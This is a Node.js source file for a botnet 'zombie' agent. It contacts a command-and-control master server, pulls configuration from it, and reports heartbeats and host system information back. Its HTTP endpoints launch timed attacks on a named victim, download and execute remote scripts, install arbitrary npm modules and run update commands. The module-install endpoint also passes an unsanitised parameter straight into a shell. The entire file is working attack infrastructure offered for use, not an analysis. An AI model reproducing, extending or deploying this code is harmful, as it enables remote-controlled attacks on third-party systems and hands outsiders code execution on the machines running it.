const { exec } = require('child_process');

const express = require('express');
const app = express()

const fs = require('fs')
const axios = require('axios');
const EventEmitter = require('events')
const moment = require('moment')
const delay = require('delay')
const si = require('systeminformation');

let master_ = "master.api.canavar.licentia.xyz"
let master = null
var masterReachable = new EventEmitter()
var settingIntegrity = new EventEmitter()
let fullyInitiated = false
let htserver = null

let zombie = {
    port: {
        number: (Math.floor(Math.random() * (9999 - 1000 + 1)) + 1000),
        change: function () {
            zombie.port.number = Math.floor(Math.random() * (9999 - 1000 + 1)) + 1000;
            zombie.port.lastChanged = Date.now()
            htserver.close()
            htserver = app.listen(zombie.port.number, () => console.log(`App listening on port ${zombie.port.number} !`))
            return zombie.port.number
        },
        lastChanged: Date.now()
    },
    currentAttack: {
        victim: null,
        doneby: null,
        id: null,
        timer: null,
        method: null
    },
    init: Date.now(),
    busy: false,
    installedScripts: [],
    systemInfo: {
        static: null,
        dynamic: {
            cpu: {
                brand: null,
                speed: null,
                voltage: null
            },
            mem: {
                total: null,
                free: null,
                used: null,
                active: null,
                available: null
            },
            load: null,
            net: null
        }
    },
    config: {
        restart: {
            scheduled: false,
            at: null,
            last: null
        },
        lockdown: true,
        allDynamicData: null,
        staticData: null,
        simpleHeartbeatDelay: null,
        complexHeartbeatDelay: null,
        refreshTimerDelay: null,
        siDataPlacementDelay: null,
        dynDataPlacementDelay: null,
        maximumPortLife: null
    },
    setupdata: {

    }
}

checkMaster(master_)

function checkMaster(master__) {
    console.log("Checking master @ " + master_);
    axios.get("http://" + master__)
        .then(res => {
            let code = res.statusCode
            let statusMessage = res.statusMessage
            let body = res.data
            if ((body === "OKAY" || ((code === 200) && (statusMessage === "OK")))) {
                console.log("Master reached.", master__);
                master = master__
                masterReachable.emit('true', master__);
            } else {
                console.log("Master data response invalid. falling back again.");
                setTimeout(() => {
                    checkMaster(master_)
                }, 1000);
            }
        })
        .catch(err => {
            console.log("Cannot reach master. falling back again.");
            console.log(master);
            console.log(err.message);
            setTimeout(() => {
                checkMaster(master_)
            }, 3000);
        })
}


async function fetchSettings() {
    return axios.get("http://" + master + "/globals")
        .then(res => {
            zombie.config = res.data 
        })
        .catch(err => {
            console.error(err);
        })
}

async function fetchSetup() {
    return axios.get("http://" + master + "/setup")
    .then(res => {
        zombie.setupdata = res.data
    })
    .catch(err => {
        console.error(err);
    })
}

async function primaryFetch() {
    console.log("pf");
    console.log("fetching settings from " + "http://" + master + "/globals");
    await fetchSettings()
    console.log("fs done");
    await fetchSetup()
    console.log("fse done");
    settingIntegrity.emit('true')

}

masterReachable.on('true', (s) => {
    master = s
    console.log('Master has been reached!', s);
    primaryFetch()
});

settingIntegrity.on('true', () => {
    console.log("SETTING INTEGRITY OK!");
    app.get('/attack/:methodID/:victim/:time/:attackID', (req, res) => {
        if (zombie.busy === false) {
            let victim = req.params.victim
            let timelimit = req.params.time
            if (isNaN(timelimit)) {
                res.send(405, { error: "INVALID_TIME_LIMIT" })
            }
            else {
                axios.get("http://" + master + "/scripts?" + req.params.methodID)
                    .then(resp => {
                        let methodfilename = `${__dirname}/scripts/${resp.data.filename}`
                        if (fs.existsSync(methodfilename)) {
                            // path exists
                            console.log("exists:", methodfilename);
                            let script = resp.data
                            script.victim = req.params.victim
                            script.scriptdir = zombie.setupdata.scriptdir
                            script.dictation = stitchSetupLines("dictation", script)
                            console.log(script);

                            startAttack((script), req.params.victim, req.params.time)
                            zombie.currentAttack.victim = req.params.victim
                            zombie.currentAttack.timer = req.params.time
                            zombie.currentAttack.id = req.params.attackID
                            zombie.currentAttack.method = script
                            zombie.currentAttack.doneby = moment().add({ seconds: timelimit }).unix() * 1000
                            zombie.busy = true
                            res.send(200, { success: true, message: `Attacking ${victim} with TL ${timelimit}`, doneby: zombie.currentAttack.doneby })
                        } else {
                            console.log("DOES NOT exist:", methodfilename);
                            res.send(500, { error: { code: "SCRIPT_NOT_INSTALLED", message: `Script is not installed on the machine. ${methodfilename}` } })
                        }
                    })
                    .catch(err => {
                        res.send(500, { error: err.message })
                        console.log(err);
                    })

            }
        }
        else {
            res.send(405, { error: "MACHINE_IS_BUSY" })
        }
    })

    app.get('/status', (req, res) => {
        let zombie_ = zombie
        zombie_.aliveFor = Date.now() - zombie.init
        res.send(200, { zombie_ })
    })

    app.get('/update', (req, res) => {
        exec(zombie.setupdata.slaveUpdate, (err, stdout, stderr) => {
            if (err) {
                //some err occurred
                console.error(err)
                res.send(200, { std_err: err })
            } else {
                // the *entire* stdout and stderr (buffered)
                console.log(`stdout: ${stdout}`);
                console.log(`stderr: ${stderr}`);
                res.send(200, { std_out: stdout, std_err: stderr })
            }
        })
    })
    app.get('/npminstall/:module', (req, res) => {
        exec(`cd /${__dirname}/; npm install ${req.params.module};`, (err, stdout, stderr) => {
            if (err) {
                //some err occurred
                console.error(err)
            } else {
                // the *entire* stdout and stderr (buffered)
                console.log(`stdout: ${stdout}`);
                console.log(`stderr: ${stderr}`);
            }
        })
    })
    app.get('/installScript/:scriptid', (req, res) => {
        let scriptid = req.params.scriptid
        axios.get("http://" + master + "/scripts?" + scriptid)
            .then(resp => {
                console.log(resp.data)
                axios.get("http://" + master + "/scripts?" + scriptid + "&download")
                    .then(resp => {
                        console.log("EXECUTE : " + resp.data)
                        exec(resp.data, (err, stdout, stderr) => {
                            if (err) {
                                //some err occurred
                                console.error(err)
                            } else {
                                // the *entire* stdout and stderr (buffered)
                                console.log(`stdout: ${stdout}`);
                                console.log(`stderr: ${stderr}`);
                            }
                        })
                        res.send(200)
                    })
                    .catch(err => {
                        res.send(500, { error: err.response.data.error })
                    })
            })
            .catch(err => {
                res.send(500, { error: err.response.data.error })
            })
    })

    app.get('/currentAttack/', (req, res) => {
        res.send(200, zombie.currentAttack)
    })

    htserver = app.listen(zombie.port.number, () => console.log(`App listening on port! ${zombie.port.number}`))


    async function complexHeartbeat() {
        if (!zombie.busy) {
            axios.post("http://" + master + "/heartbeat", { machine: zombie })
                .then(res => {
                    console.log(res.data);
                })
                .catch(err => {
                    console.log(err);
                })
        }
    }
    async function simpleHeartbeat() {
        console.log("HEARTBEAT");
        axios.patch("http://" + master + "/heartbeat", { machine: {
            port: {
                number: zombie.port.number,
                lastChanged: zombie.port.lastChanged
            },
            currentAttack: zombie.currentAttack,
            init: zombie.init,
            busy: zombie.busy
        } })
            .then(res => {
                //console.log(res.data);
            })
            .catch(err => {
                console.log(err);
            })
    }


    var simpleHeartbeatTimer = function () {
        simpleHeartbeat()
        console.log("hb");
        setTimeout(simpleHeartbeatTimer, zombie.config.simpleHeartbeatDelay);
    }

    var complexHeartbeatTimer = function () {
        complexHeartbeat()
        setTimeout(complexHeartbeatTimer, zombie.config.complexHeartbeatDelay);
    }

    var refreshMasterTimer = function () {
        fetchSettings()
        fetchSetup()
        setTimeout(refreshMasterTimer, zombie.config.refreshTimerDelay);
    }

    var siDataPlacementTimer = function () {
        dynamicDataPlacement()
        setTimeout(siDataPlacementTimer, zombie.config.siDataPlacementDelay);
    }

    var detailedDynamicDataPlacementTimer = function () {
        detailedDynamicDataPlacement()
        setTimeout(detailedDynamicDataPlacementTimer, zombie.config.dynDataPlacementDelay);
    }

    simpleHeartbeatTimer()
    complexHeartbeatTimer()
    refreshMasterTimer()
    siDataPlacementTimer()
    detailedDynamicDataPlacementTimer()

    function detailedDynamicDataPlacement() {
        if (!zombie.busy && zombie.config.allDynamicData) {
            si.getDynamicData(function (data) {
                zombie.systemInfo.dynamic.all = data
            })
        }
    }

    function staticDataPlacement() {
        if (!zombie.busy && zombie.config.staticData) {
            si.getStaticData(function (data) {
                zombie.systemInfo.static = data
            })
        }
    }

    staticDataPlacement()

    async function dynamicDataPlacement() {
        if (!zombie.busy) {
            si.cpu(function (cpudata) {
                zombie.systemInfo.dynamic.cpu.voltage = cpudata.voltage
                zombie.systemInfo.dynamic.cpu.speed = cpudata.speed
                zombie.systemInfo.dynamic.cpu.brand = cpudata.brand
            })
            si.mem(function (memdata) {
                zombie.systemInfo.dynamic.mem.total = memdata.total
                zombie.systemInfo.dynamic.mem.free = memdata.free
                zombie.systemInfo.dynamic.mem.used = memdata.used
                zombie.systemInfo.dynamic.mem.active = memdata.active
                zombie.systemInfo.dynamic.mem.available = memdata.available
            })
            si.currentLoad(function (data) {
                zombie.systemInfo.dynamic.load = data
            })
            si.networkStats(function (data) {
                zombie.systemInfo.dynamic.net = data
            })
        }
    }
    fullyInitiated = true
});

function stitchSetupLines(asked, setup_) {
    if (setup_[asked]) {
        if ((setup_[asked]).includes("[")) {
            let a = setup_[asked]
            let b = (a.split("["));
            for (let c = 0; c < b.length; c++) {
                let d = b[c];
                d = d.split("]")[0]
                if (setup_[d]) {
                    b[c] = setup_[d]
                }
            }
            let e = b.join("")
            return e
        } else {
            return (setup_[asked])
        }
    } else {
        return null
    }
}

async function startAttack(methodData, victim, time) {
    let command = (methodData.dictation).replace("$VICTIM", `http://${victim}`)
    console.log(command);
    exec(command, (err, stdout, stderr) => {
        if (err) {
            //some err occurred
            console.log(err)
        } else {
            // the *entire* stdout and stderr (buffered)
            console.log(`stdout: ${stdout}`);
            console.log(`stderr: ${stderr}`);
        }
    });
    await delay(time * 1000)
    zombie.currentAttack = {
        victim: null,
        doneby: null,
        id: null,
        timer: null,
        method: null
    },
        zombie.busy = false
    exec(`pkill -9 ${methodData.process}`, (err, stdout, stderr) => { //SHOULD USE KILLALL'S YOUNGER/OLDER THAN ARGUMENTS!
        if (err) {
            //some err occurred
            console.error(err)
        } else {
            // the *entire* stdout and stderr (buffered)
            console.log(`stdout: ${stdout}`);
            console.log(`stderr: ${stderr}`);
        }
    });



}